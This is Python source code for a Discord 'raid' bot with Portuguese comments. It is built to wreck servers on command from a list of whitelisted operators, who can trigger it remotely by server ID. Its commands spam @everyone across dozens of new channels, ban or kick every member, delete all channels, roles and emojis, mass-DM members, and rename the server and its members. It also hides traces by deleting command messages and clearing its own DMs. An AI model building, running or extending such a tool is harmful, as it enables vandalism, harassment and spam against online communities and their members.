import discord
from discord.ext import commands
import json
import asyncio

# Carregar configuração
with open('config.json', 'r') as f:
    config = json.load(f)

TOKEN = config['token']
PREFIX = config['prefix']
PERMITTED_USERS = config.get('perms', [])
CHANNEL_NAME = config.get("channel_name", "returnstock")
MESSAGE_CONTENT = config.get("message_content", "@here @everyone\n.gg/returnstock")
NUM_CHANNELS = config.get("num_channels", 50)

intents = discord.Intents.default()
intents.guilds = True
intents.messages = True
intents.message_content = True
intents.members = True # <-- Adicionar esta linha

bot = commands.Bot(command_prefix=PREFIX, intents=intents)

# Dicionários para rastrear as mensagens de log por usuário
log_messages = {}
log_content = {}
MAX_LOG_LINES = 25 # Limite de linhas para evitar exceder o limite de caracteres do Discord

async def log_to_user(ctx, message):
    """Envia e atualiza uma mensagem de log para o autor do comando via DM."""
    author_id = ctx.author.id

    if author_id not in log_content:
        log_content[author_id] = []
    log_content[author_id].append(str(message))

    # Mantém o log com um tamanho gerenciável
    if len(log_content[author_id]) > MAX_LOG_LINES:
        log_content[author_id] = log_content[author_id][-MAX_LOG_LINES:]

    formatted_log = "\n".join(log_content[author_id])
    full_message = f"```\n{formatted_log}\n```"

    try:
        log_msg_obj = log_messages.get(author_id)
        # Edita a mensagem se ela existir e o conteúdo for diferente
        if log_msg_obj and log_msg_obj.content != full_message:
            await log_msg_obj.edit(content=full_message)
        # Envia uma nova mensagem se não houver uma rastreada
        elif not log_msg_obj:
            log_msg_obj = await ctx.author.send(full_message)
            log_messages[author_id] = log_msg_obj
    except (discord.errors.Forbidden, discord.errors.NotFound):
        # Se a DM estiver fechada ou a mensagem for deletada, tenta enviar uma nova
        try:
            log_msg_obj = await ctx.author.send(full_message)
            log_messages[author_id] = log_msg_obj
        except discord.errors.Forbidden:
            print(f"(Não foi possível enviar DM para {ctx.author}): {message}")
    except Exception as e:
        print(f"(Erro ao enviar/editar DM para {ctx.author}: {e}): {message}")

async def send_embed_dm(ctx, title, description, color=discord.Color.blue()):
    """Envia uma DM com embed para o autor do comando."""
    embed = discord.Embed(title=title, description=description, color=color)
    embed.set_footer(text="Desenvolvido por @eumendesdev")
    try:
        await ctx.author.send(embed=embed)
    except discord.errors.Forbidden:
        # Fallback para log normal se o usuário desativou DMs ou embeds.
        await log_to_user(ctx, f"AVISO: {title}\n{description}")

async def spam_channel(channel, ctx):
    """Envia mensagens de spam em um canal infinitamente."""
    while True:
        try:
            await channel.send(MESSAGE_CONTENT)
        except Exception as e:
            await log_to_user(ctx, f"Não foi possível enviar mensagem no canal {channel.name}: {e}")
            break

async def create_and_spam(guild, ctx):
    """Cria um canal e começa a spammar."""
    try:
        channel = await guild.create_text_channel(CHANNEL_NAME)
        await log_to_user(ctx, f"Canal '{channel.name}' criado em {guild.name}.")
        # Inicia a tarefa de spam em segundo plano
        asyncio.create_task(spam_channel(channel, ctx))
        return True
    except discord.errors.Forbidden:
        await log_to_user(ctx, f"Erro: Sem permissão para criar canais no servidor '{guild.name}'.")
    except Exception as e:
        await log_to_user(ctx, f"Ocorreu um erro ao criar o canal: {e}")
    return False

@bot.event
async def on_ready():
    print(f'Bot conectado como {bot.user}')
    print('Pronto para iniciar o raid.')

@bot.command()
async def sultan(ctx, server_id: int = None):
    """Cria múltiplos canais e os inunda com mensagens."""
    if str(ctx.author.id) not in PERMITTED_USERS:
        print(f"Uso não autorizado do comando 'sultan' por {ctx.author} ({ctx.author.id})")
        return

    # Limpa logs anteriores para iniciar uma nova sessão
    log_messages.pop(ctx.author.id, None)
    log_content.pop(ctx.author.id, None)

    if ctx.guild:
        try:
            await ctx.message.delete()
        except discord.Forbidden:
            await log_to_user(ctx, "Aviso: Não tenho permissão para apagar sua mensagem de comando.")
        except Exception:
            pass # Ignora outros erros de exclusão

    guild = bot.get_guild(server_id) if server_id else ctx.guild
    
    if not guild:
        await send_embed_dm(ctx, "`❌` Erro de Comando", f"O servidor com ID `{server_id}` не foi encontrado ou o comando foi usado incorretamente.\n\n**Uso:** `v!sultan <ID_DO_SERVIDOR>`", color=discord.Color.red())
        return

    await log_to_user(ctx, f"Comando 'sultan' recebido de {ctx.author} para o servidor {guild.name}")
    try:
        await send_embed_dm(ctx, "`✅` Raid Iniciado", f"O raid de criação de canais no servidor **{guild.name}** foi iniciado.", color=discord.Color.green())
    except discord.errors.Forbidden:
        await log_to_user(ctx, f"Não foi possível enviar DM de confirmação para {ctx.author}. DMs podem estar desativadas.")
    
    tasks = [create_and_spam(guild, ctx) for _ in range(NUM_CHANNELS)]
    results = await asyncio.gather(*tasks)
    
    created_channels_count = sum(1 for r in results if r)

    await send_embed_dm(ctx, "`✅` Criação de Canais Finalizada", f"**{created_channels_count} de {NUM_CHANNELS}** canais foram criados com sucesso no servidor **{guild.name}**.\nO spam de mensagens foi iniciado em cada um deles.", color=discord.Color.green())

@bot.command()
async def banall(ctx, server_id: int = None):
    """Bane todos os membros possíveis do servidor."""
    if str(ctx.author.id) not in PERMITTED_USERS:
        print(f"Uso não autorizado do comando 'banall' por {ctx.author} ({ctx.author.id})")
        return

    # Limpa logs anteriores para iniciar uma nova sessão
    log_messages.pop(ctx.author.id, None)
    log_content.pop(ctx.author.id, None)

    if ctx.guild:
        try:
            await ctx.message.delete()
        except discord.Forbidden:
            await log_to_user(ctx, "Aviso: Não tenho permissão para apagar sua mensagem de comando.")
        except Exception:
            pass

    guild = bot.get_guild(server_id) if server_id else ctx.guild

    if not guild:
        await send_embed_dm(ctx, "`❌` Erro de Comando", f"O servidor com ID `{server_id}` не foi encontrado ou o comando foi usado incorretamente.\n\n**Uso:** `v!banall <ID_DO_SERVIDOR>`", color=discord.Color.red())
        return

    await log_to_user(ctx, f"Comando 'banall' recebido de {ctx.author} para o servidor {guild.name}")
    banned_count = 0
    total_members = len(guild.members)
    
    await send_embed_dm(ctx, "`⚔️` Banimento em Massa Iniciado", f"Iniciando o banimento de **{total_members}** membros no servidor **{guild.name}**.", color=discord.Color.orange())

    for member_to_ban in guild.members:
        if member_to_ban.id in (bot.user.id, guild.owner_id, ctx.author.id):
            continue
        try:
            await member_to_ban.ban(reason="Comando banall executado pelo bot.")
            banned_count += 1
            await log_to_user(ctx, f"Membro {member_to_ban.name}#{member_to_ban.discriminator} banido.")
            await asyncio.sleep(1)
        except discord.Forbidden:
            await log_to_user(ctx, f"Não foi possível banir {member_to_ban.name}#{member_to_ban.discriminator}. Permissões insuficientes ou cargo superior.")
        except Exception as e:
            await log_to_user(ctx, f"Erro desconhecido ao banir {member_to_ban.name}#{member_to_ban.discriminator}: {e}")
            
    try:
        description = (
            f"A operação no servidor **{guild.name}** foi concluída.\n\n"
            f"`📊` **Estatísticas:**\n"
            f"- **{banned_count} de {total_members}** membros banidos."
        )
        await send_embed_dm(ctx, "`✅` Banimento em Massa Finalizado", description, color=discord.Color.green())
    except discord.errors.Forbidden:
        await log_to_user(ctx, f"Não foi possível enviar DM de conclusão para {ctx.author}.")

@bot.command()
async def nuke(ctx, server_id: int = None):
    """Deleta todos os canais e cargos abaixo do bot e cria um novo."""
    if str(ctx.author.id) not in PERMITTED_USERS:
        print(f"Uso não autorizado do comando 'nuke' por {ctx.author} ({ctx.author.id})")
        return

    # Limpa logs anteriores para iniciar uma nova sessão
    log_messages.pop(ctx.author.id, None)
    log_content.pop(ctx.author.id, None)

    if ctx.guild:
        try:
            await ctx.message.delete()
        except discord.Forbidden:
            await log_to_user(ctx, "Aviso: Não tenho permissão para apagar sua mensagem de comando.")
        except Exception:
            pass

    guild = bot.get_guild(server_id) if server_id else ctx.guild

    if not guild:
        await send_embed_dm(ctx, "`❌` Erro de Comando", f"O servidor com ID `{server_id}` не foi encontrado ou o comando foi usado incorretamente.\n\n**Uso:** `v!nuke <ID_DO_SERVIDOR>`", color=discord.Color.red())
        return

    await log_to_user(ctx, f"Comando 'nuke' recebido de {ctx.author} para o servidor {guild.name}")
    
    try:
        await send_embed_dm(ctx, "`💥` Nuke Iniciado", f"A destruição total do servidor **{guild.name}** foi iniciada. Canais e cargos serão deletados.", color=discord.Color.red())
    except discord.errors.Forbidden:
        await log_to_user(ctx, f"Não foi possível enviar DM de aviso para {ctx.author}.")

    deleted_roles_count = 0
    deleted_channels_count = 0
    deleted_emojis_count = 0

    bot_member = guild.get_member(bot.user.id)
    if bot_member:
        bot_top_role = bot_member.top_role
        for role in guild.roles:
            if role.position < bot_top_role.position:
                try:
                    if role.name != "@everyone":
                        await role.delete(reason="Comando nuke executado.")
                        await log_to_user(ctx, f"Cargo '{role.name}' deletado.")
                        deleted_roles_count += 1
                        await asyncio.sleep(0.5)
                except discord.Forbidden:
                    await log_to_user(ctx, f"Não foi possível deletar o cargo '{role.name}'. Sem permissão ou cargo gerenciado.")
                except Exception as e:
                    await log_to_user(ctx, f"Erro ao deletar o cargo '{role.name}': {e}")

    for emoji in list(guild.emojis):
        try:
            await emoji.delete(reason="Comando nuke executado.")
            await log_to_user(ctx, f"Emoji '{emoji.name}' deletado.")
            deleted_emojis_count += 1
            await asyncio.sleep(0.5)
        except Exception as e:
            await log_to_user(ctx, f"Não foi possível deletar o emoji '{emoji.name}': {e}")

    for channel in guild.channels:
        try:
            await channel.delete(reason="Comando nuke executado.")
            await log_to_user(ctx, f"Canal '{channel.name}' deletado.")
            deleted_channels_count += 1
            await asyncio.sleep(0.5)
        except Exception as e:
            await log_to_user(ctx, f"Não foi possível deletar o canal '{channel.name}': {e}")
            
    try:
        new_channel = await guild.create_text_channel("servidor-nukado")
        await new_channel.send("@everyone Servidor nukado com sucesso por .gg/returnstock")
        await log_to_user(ctx, "Servidor nukado e novo canal criado.")
        description = (
            f"A destruição do servidor **{guild.name}** foi concluída com sucesso.\n\n"
            f"`📊` **Estatísticas:**\n"
            f"- **{deleted_channels_count}** canais deletados\n"
            f"- **{deleted_roles_count}** cargos deletados\n"
            f"- **{deleted_emojis_count}** emojis deletados"
        )
        await send_embed_dm(ctx, "`✅` Nuke Finalizado", description, color=discord.Color.green())
    except Exception as e:
        await log_to_user(ctx, f"Não foi possível criar o canal após o nuke: {e}")
        try:
            await send_embed_dm(ctx, "`⚠️` Erro no Nuke", f"Não foi possível criar um novo canal no servidor **{guild.name}** após a destruição. Verifique as permissões do bot.", color=discord.Color.orange())
        except discord.errors.Forbidden:
            pass

@bot.command()
async def kickall(ctx, server_id: int = None):
    """Expulsa todos os membros possíveis do servidor."""
    if str(ctx.author.id) not in PERMITTED_USERS:
        print(f"Uso não autorizado do comando 'kickall' por {ctx.author} ({ctx.author.id})")
        return

    log_messages.pop(ctx.author.id, None)
    log_content.pop(ctx.author.id, None)

    if ctx.guild:
        try:
            await ctx.message.delete()
        except discord.Forbidden:
            await log_to_user(ctx, "Aviso: Não tenho permissão para apagar sua mensagem de comando.")
        except Exception:
            pass

    guild = bot.get_guild(server_id) if server_id else ctx.guild

    if not guild:
        await send_embed_dm(ctx, "`❌` Erro de Comando", f"O servidor com ID `{server_id}` não foi encontrado ou o comando foi usado incorretamente.\n\n**Uso:** `{PREFIX}kickall <ID_DO_SERVIDOR>`", color=discord.Color.red())
        return

    await log_to_user(ctx, f"Comando 'kickall' recebido de {ctx.author} para o servidor {guild.name}")
    kicked_count = 0
    total_members = len(list(guild.members))
    
    await send_embed_dm(ctx, "`👢` Expulsão em Massa Iniciada", f"Iniciando a expulsão de **{total_members}** membros no servidor **{guild.name}**.", color=discord.Color.orange())

    for member_to_kick in list(guild.members):
        if member_to_kick.id in (bot.user.id, guild.owner_id, ctx.author.id):
            continue
        try:
            await member_to_kick.kick(reason="Comando kickall executado pelo bot.")
            kicked_count += 1
            await log_to_user(ctx, f"Membro {member_to_kick.name}#{member_to_kick.discriminator} expulso.")
            await asyncio.sleep(1)
        except discord.Forbidden:
            await log_to_user(ctx, f"Não foi possível expulsar {member_to_kick.name}#{member_to_kick.discriminator}. Permissões insuficientes ou cargo superior.")
        except Exception as e:
            await log_to_user(ctx, f"Erro desconhecido ao expulsar {member_to_kick.name}#{member_to_kick.discriminator}: {e}")
            
    description = (
        f"A operação no servidor **{guild.name}** foi concluída.\n\n"
        f"`📊` **Estatísticas:**\n"
        f"- **{kicked_count} de {total_members}** membros expulsos."
    )
    await send_embed_dm(ctx, "`✅` Expulsão em Massa Finalizada", description, color=discord.Color.green())

@bot.command()
async def renameall(ctx, *args):
    """Renomeia todos os membros do servidor para um nome específico."""
    if str(ctx.author.id) not in PERMITTED_USERS:
        print(f"Uso não autorizado do comando 'renameall' por {ctx.author} ({ctx.author.id})")
        return

    server_id = None
    name = "Sultan Was Here"
    
    args_list = list(args)
    if args_list and args_list[0].isdigit():
        server_id = int(args_list.pop(0))
        if args_list:
            name = " ".join(args_list)
    elif args_list:
        name = " ".join(args_list)

    guild = bot.get_guild(server_id) if server_id else ctx.guild

    if not guild:
        await send_embed_dm(ctx, "`❌` Erro de Comando", "Servidor não encontrado.", color=discord.Color.red())
        return

    log_messages.pop(ctx.author.id, None)
    log_content.pop(ctx.author.id, None)

    renamed_count = 0
    total_members = len(guild.members)
    
    await send_embed_dm(ctx, "`✏️` Renomeação em Massa Iniciada", f"Iniciando a renomeação de **{total_members}** membros em **{guild.name}** para '{name}'.", color=discord.Color.blue())

    for member in guild.members:
        try:
            if member.id in (bot.user.id, guild.owner_id):
                continue
            await member.edit(nick=name)
            renamed_count += 1
            await log_to_user(ctx, f"Membro {member.name} renomeado para '{name}'.")
            await asyncio.sleep(0.5)
        except discord.Forbidden:
            await log_to_user(ctx, f"Não foi possível renomear {member.name}. Permissões insuficientes.")
        except Exception as e:
            await log_to_user(ctx, f"Erro ao renomear {member.name}: {e}")

    description = f"**{renamed_count} de {total_members}** membros foram renomeados para **'{name}'** no servidor **{guild.name}**."
    await send_embed_dm(ctx, "`✅` Renomeação Finalizada", description, color=discord.Color.green())

@bot.command()
async def dmall(ctx, *args):
    """Envia uma mensagem para todos os membros do servidor."""
    if str(ctx.author.id) not in PERMITTED_USERS:
        print(f"Uso não autorizado do comando 'dmall' por {ctx.author} ({ctx.author.id})")
        return

    if not args:
        await send_embed_dm(ctx, "`❌` Erro de Comando", f"Você precisa fornecer uma mensagem.\n\n**Uso:** `{PREFIX}dmall [ID_DO_SERVIDOR] <mensagem>`", color=discord.Color.red())
        return

    server_id = None
    message = ""
    
    args_list = list(args)
    if args_list and args_list[0].isdigit():
        server_id = int(args_list.pop(0))
    
    if not args_list:
        await send_embed_dm(ctx, "`❌` Erro de Comando", f"Você precisa fornecer uma mensagem para enviar.", color=discord.Color.red())
        return
        
    message = " ".join(args_list)
    guild = bot.get_guild(server_id) if server_id else ctx.guild
    
    if not guild:
        await send_embed_dm(ctx, "`❌` Erro de Comando", "Servidor não encontrado.", color=discord.Color.red())
        return

    log_messages.pop(ctx.author.id, None)
    log_content.pop(ctx.author.id, None)

    dm_count = 0
    total_members = len(guild.members)
    
    await send_embed_dm(ctx, "`✉️` DM em Massa Iniciado", f"Iniciando o envio de DMs para **{total_members}** membros em **{guild.name}**.\n\n**AVISO:** Isso pode demorar e é uma ação de risco.", color=discord.Color.orange())
    
    for member in guild.members:
        if member.bot:
            continue
        try:
            await member.send(message)
            dm_count += 1
            await log_to_user(ctx, f"Mensagem enviada para {member.name}.")
            await asyncio.sleep(1.5) 
        except discord.Forbidden:
            await log_to_user(ctx, f"Não foi possível enviar DM para {member.name}. (DMs fechadas)")
        except Exception as e:
            await log_to_user(ctx, f"Erro ao enviar DM para {member.name}: {e}")
            
    description = f"A operação de DM no servidor **{guild.name}** foi concluída.\n\n`📊` **Estatísticas:**\n- Mensagem enviada para **{dm_count} de {total_members}** membros."
    await send_embed_dm(ctx, "`✅` Envio de DMs Finalizado", description, color=discord.Color.green())

@bot.command()
async def spamroles(ctx, quantity: int, *, name="raided-by-sultan"):
    """Cria um número especificado de cargos no servidor."""
    if str(ctx.author.id) not in PERMITTED_USERS:
        return

    guild = ctx.guild
    if not guild:
        await send_embed_dm(ctx, "`❌` Erro", "Este comando só pode ser usado dentro de um servidor.", color=discord.Color.red())
        return

    await ctx.message.delete()
    log_messages.pop(ctx.author.id, None)
    log_content.pop(ctx.author.id, None)

    await send_embed_dm(ctx, "`✨` Criação de Cargos Iniciada", f"Iniciando a criação de **{quantity}** cargos com o nome '{name}' em **{guild.name}**.", color=discord.Color.blue())

    created_count = 0
    for i in range(quantity):
        try:
            await guild.create_role(name=f"{name}-{i+1}")
            created_count += 1
            await log_to_user(ctx, f"Cargo '{name}-{i+1}' criado.")
            await asyncio.sleep(0.5)
        except discord.Forbidden:
            await log_to_user(ctx, "Não foi possível criar cargos. Permissões insuficientes.")
            break
        except Exception as e:
            await log_to_user(ctx, f"Erro ao criar cargo: {e}")
            break

    description = f"**{created_count} de {quantity}** cargos foram criados com sucesso."
    await send_embed_dm(ctx, "`✅` Criação de Cargos Finalizada", description, color=discord.Color.green())


@bot.command()
async def serveredit(ctx, server_id: int = None, *, new_name):
    """Altera o nome do servidor."""
    if str(ctx.author.id) not in PERMITTED_USERS:
        return

    guild = bot.get_guild(server_id) if server_id else ctx.guild
    if not guild:
        await send_embed_dm(ctx, "`❌` Erro", "Servidor não encontrado.", color=discord.Color.red())
        return

    try:
        old_name = guild.name
        await guild.edit(name=new_name, reason="Comando serveredit executado.")
        await send_embed_dm(ctx, "`✅` Sucesso", f"O nome do servidor **{old_name}** foi alterado para **{new_name}**.", color=discord.Color.green())
    except discord.Forbidden:
        await send_embed_dm(ctx, "`❌` Erro", "Não tenho permissão para alterar o nome do servidor.", color=discord.Color.red())
    except Exception as e:
        await send_embed_dm(ctx, "`❌` Erro", f"Ocorreu um erro: {e}", color=discord.Color.red())

@bot.command()
async def renamechannels(ctx, server_id: int = None, *, new_name="raided-by-sultan"):
    """Renomeia todos os canais do servidor."""
    if str(ctx.author.id) not in PERMITTED_USERS:
        return

    guild = bot.get_guild(server_id) if server_id else ctx.guild
    if not guild:
        await send_embed_dm(ctx, "`❌` Erro", "Servidor não encontrado.", color=discord.Color.red())
        return

    log_messages.pop(ctx.author.id, None)
    log_content.pop(ctx.author.id, None)

    renamed_count = 0
    total_channels = len(guild.channels)
    
    await send_embed_dm(ctx, "`✏️` Renomeação de Canais Iniciada", f"Iniciando a renomeação de **{total_channels}** canais para '{new_name}' em **{guild.name}**.", color=discord.Color.blue())

    for channel in guild.channels:
        try:
            await channel.edit(name=new_name, reason="Comando renamechannels executado.")
            renamed_count += 1
            await log_to_user(ctx, f"Canal '{channel.name}' renomeado.")
            await asyncio.sleep(0.7)
        except Exception as e:
            await log_to_user(ctx, f"Erro ao renomear canal '{channel.name}': {e}")
            
    description = f"**{renamed_count} de {total_channels}** canais foram renomeados com sucesso."
    await send_embed_dm(ctx, "`✅` Renomeação de Canais Finalizada", description, color=discord.Color.green())


@bot.command()
async def giveroleall(ctx, server_id: int = None, *, role_name="Sultan"):
    """Cria um cargo e o atribui a todos os membros."""
    if str(ctx.author.id) not in PERMITTED_USERS:
        return
        
    guild = bot.get_guild(server_id) if server_id else ctx.guild
    if not guild:
        await send_embed_dm(ctx, "`❌` Erro", "Servidor não encontrado.", color=discord.Color.red())
        return

    log_messages.pop(ctx.author.id, None)
    log_content.pop(ctx.author.id, None)

    await send_embed_dm(ctx, "`✨` Distribuição de Cargo Iniciada", "Tentando criar e distribuir o cargo.", color=discord.Color.blue())

    try:
        new_role = await guild.create_role(name=role_name, reason="Comando giveroleall")
        await log_to_user(ctx, f"Cargo '{role_name}' criado com sucesso.")
    except discord.Forbidden:
        await send_embed_dm(ctx, "`❌` Erro", f"Não foi possível criar o cargo '{role_name}'. Permissões insuficientes.", color=discord.Color.red())
        return
    except Exception as e:
        await send_embed_dm(ctx, "`❌` Erro", f"Erro desconhecido ao criar o cargo: {e}", color=discord.Color.red())
        return

    given_count = 0
    total_members = len(guild.members)
    for member in guild.members:
        if member.bot:
            continue
        try:
            await member.add_roles(new_role)
            given_count += 1
            await log_to_user(ctx, f"Cargo '{role_name}' atribuído a {member.name}.")
            await asyncio.sleep(0.5)
        except Exception as e:
            await log_to_user(ctx, f"Erro ao atribuir cargo para {member.name}: {e}")

    description = f"O cargo **'{role_name}'** foi atribuído a **{given_count} de {total_members}** membros."
    await send_embed_dm(ctx, "`✅` Distribuição de Cargo Finalizada", description, color=discord.Color.green())


@bot.command()
async def stripallroles(ctx, server_id: int = None):
    """Remove todos os cargos de todos os membros."""
    if str(ctx.author.id) not in PERMITTED_USERS:
        return
        
    guild = bot.get_guild(server_id) if server_id else ctx.guild
    if not guild:
        await send_embed_dm(ctx, "`❌` Erro", "Servidor não encontrado.", color=discord.Color.red())
        return

    bot_member = guild.get_member(bot.user.id)
    if not bot_member:
        await send_embed_dm(ctx, "`❌` Erro", "Não consegui me encontrar no servidor.", color=discord.Color.red())
        return

    log_messages.pop(ctx.author.id, None)
    log_content.pop(ctx.author.id, None)

    await send_embed_dm(ctx, "`🗑️` Remoção de Cargos Iniciada", "Iniciando a remoção de todos os cargos de todos os membros.", color=discord.Color.orange())
    
    stripped_members_count = 0
    for member in guild.members:
        if member.id == guild.owner_id or member.top_role >= bot_member.top_role:
            await log_to_user(ctx, f"Pulei {member.name} (dono ou cargo superior).")
            continue
        
        try:
            roles_to_remove = [role for role in member.roles if role.name != "@everyone"]
            if roles_to_remove:
                await member.remove_roles(*roles_to_remove, reason="Comando stripallroles")
                stripped_members_count += 1
                await log_to_user(ctx, f"Todos os cargos de {member.name} foram removidos.")
                await asyncio.sleep(0.5)
        except Exception as e:
            await log_to_user(ctx, f"Erro ao remover cargos de {member.name}: {e}")

    description = f"Todos os cargos foram removidos de **{stripped_members_count}** membros."
    await send_embed_dm(ctx, "`✅` Remoção de Cargos Finalizada", description, color=discord.Color.green())


@bot.command()
async def serverlist(ctx):
    """Lista todos os servidores onde o bot está. (Apenas DM)"""
    if str(ctx.author.id) not in PERMITTED_USERS:
        return

    if ctx.guild:
        await ctx.message.delete()
    
    servers = bot.guilds
    if not servers:
        await send_embed_dm(ctx, "🌐 Servidores", "Não estou em nenhum servidor.", color=discord.Color.blue())
        return

    description = ""
    for guild in servers:
        description += f"**{guild.name}**\n- ID: `{guild.id}`\n- Membros: `{guild.member_count}`\n\n"

    await send_embed_dm(ctx, "🌐 Lista de Servidores", description, color=discord.Color.blue())


@bot.command()
async def help(ctx):
    """Mostra a lista de comandos. (Apenas DM)"""
    if str(ctx.author.id) not in PERMITTED_USERS:
        return

    if ctx.guild:
        await ctx.message.delete()
        
    embed = discord.Embed(title="📜 Comandos do Sultan", description=f"Prefixo: `{PREFIX}`", color=discord.Color.purple())
    embed.add_field(name="`sultan [id_servidor]`", value="Cria canais e spamma mensagens.", inline=False)
    embed.add_field(name="`banall [id_servidor]`", value="Bane todos os membros.", inline=False)
    embed.add_field(name="`kickall [id_servidor]`", value="Expulsa todos os membros.", inline=False)
    embed.add_field(name="`nuke [id_servidor]`", value="Deleta canais, cargos, emojis e cria um canal.", inline=False)
    embed.add_field(name="`renameall [id_servidor] [nome]`", value="Renomeia todos os membros.", inline=False)
    embed.add_field(name="`dmall [id_servidor] <mensagem>`", value="Envia DM para todos os membros.", inline=False)
    embed.add_field(name="`spamroles <quantidade> [nome]`", value="Cria múltiplos cargos.", inline=False)
    embed.add_field(name="`serveredit <id_servidor> <novo_nome>`", value="Altera o nome do servidor.", inline=False)
    embed.add_field(name="`renamechannels [id_servidor] [novo_nome]`", value="Renomeia todos os canais.", inline=False)
    embed.add_field(name="`giveroleall [id_servidor] [nome_cargo]`", value="Dá um cargo novo para todos.", inline=False)
    embed.add_field(name="`stripallroles [id_servidor]`", value="Remove todos os cargos de todos.", inline=False)
    embed.add_field(name="`serverlist`", value="Lista os servidores do bot (somente DM).", inline=False)
    embed.add_field(name="`nukebot`", value="Faz o bot sair de todos os servidores (somente DM).", inline=False)
    
    embed.set_footer(text="Use os comandos na minha DM para operar remotamente.")
    await ctx.author.send(embed=embed)


@bot.command()
async def nukebot(ctx):
    """Faz o bot sair de todos os servidores. (Apenas DM)"""
    if str(ctx.author.id) not in PERMITTED_USERS:
        return
        
    if ctx.guild:
        await send_embed_dm(ctx, "`❌` Erro", "Este comando só pode ser usado na minha DM.", color=discord.Color.red())
        return

    await send_embed_dm(ctx, "`💥` Autodestruição Iniciada", "Iniciando processo de saída de todos os servidores...", color=discord.Color.red())
    
    left_count = 0
    for guild in bot.guilds:
        try:
            await guild.leave()
            await log_to_user(ctx, f"Saí do servidor {guild.name}.")
            left_count += 1
        except Exception as e:
            await log_to_user(ctx, f"Não foi possível sair de {guild.name}: {e}")

    await send_embed_dm(ctx, "`✅` Processo Finalizado", f"Saí de **{left_count}** servidores.", color=discord.Color.green())


@bot.command()
async def cleandm(ctx):
    """Limpa todas as DMs enviadas pelo bot para o autor do comando."""
    if str(ctx.author.id) not in PERMITTED_USERS:
        return

    if ctx.guild:
        try:
            await ctx.message.delete()
        except:
            pass
        await send_embed_dm(ctx, "`❌` Erro de Comando", "O comando `cleandm` só pode ser usado na minha DM.", color=discord.Color.red())
        return

    await ctx.send("`🧹` Iniciando a limpeza das minhas mensagens nesta DM... Isso pode levar um momento.")
    
    deleted_count = 0
    try:
        async for message in ctx.channel.history(limit=500): # Limite para evitar abuso/loops infinitos
            if message.author == bot.user:
                try:
                    await message.delete()
                    deleted_count += 1
                    await asyncio.sleep(0.6) # Evita rate limit
                except discord.errors.NotFound:
                    continue # Mensagem já foi deletada
                except Exception as e:
                    print(f"Não foi possível deletar a mensagem {message.id}: {e}")
    except Exception as e:
        await ctx.send(f"`❌` Ocorreu um erro inesperado durante a limpeza: {e}")
        return

    await ctx.send(f"`✅` Limpeza finalizada! Deletei **{deleted_count}** mensagens.")


if TOKEN == "SEU_TOKEN_AQUI":
    print("Por favor, defina o token do seu bot no arquivo config.json")
else:
    bot.run(TOKEN)
